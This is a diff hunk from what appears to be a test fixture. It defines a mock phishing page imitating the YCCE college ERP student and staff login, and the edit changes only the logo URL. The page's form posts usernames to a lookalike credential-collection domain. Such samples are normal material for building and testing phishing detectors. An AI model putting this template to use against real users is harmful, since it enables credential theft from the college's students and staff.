@@ -17,7 +17,7 @@ MOCK_PHISHING_HTML = """
 <head><title>YCCE Student Login - ERP Portal</title></head>
 <body>
     <div class="login-box">
-        <img src="http://erp.ycce.edu.in/logo.png" alt="YCCE College Logo" />
+        <img src="https://ycce.edu/logo.png" alt="YCCE College Logo" />
         <h2>YCCE Meghe Group ERP Student & Staff Login</h2>
         <form action="http://ycce-erp-login.xyz/submit-credentials" method="POST">
             <input type="text" name="username" placeholder="Registration ID / Username" />
